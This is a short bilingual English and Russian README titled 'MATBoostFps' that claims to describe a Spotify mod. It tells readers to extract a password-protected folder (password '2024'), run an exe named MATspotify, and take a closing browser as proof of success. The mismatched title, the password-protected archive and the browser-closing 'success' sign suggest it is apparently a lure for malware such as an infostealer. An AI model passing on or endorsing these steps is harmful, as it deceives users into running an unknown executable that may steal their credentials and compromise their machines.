# MATBoostFps
#in English:
that our mod spotify would work correctly,
we need to move this folder to the desktop,
to do this you need to enter the password:2024,
then open it and find an exe file called MATspotify and run it,
if you have closed the browser,
then congratulations! Booster worked! Now you can go listen your favorite music.

#на Русском:
что бы наш мод спотифай работал корректно,
нам нужно перекинуть данную папку на рабочий стол, 
что бы это сделать нужно ввести пароль:2024,
затем открыть ее и найти exe файл под названием MATspotify и запустить его,
если у вас закрылся браузер,
то поздравляю! мод сработал! теперь вы можете идти слушать свои любимые песни.
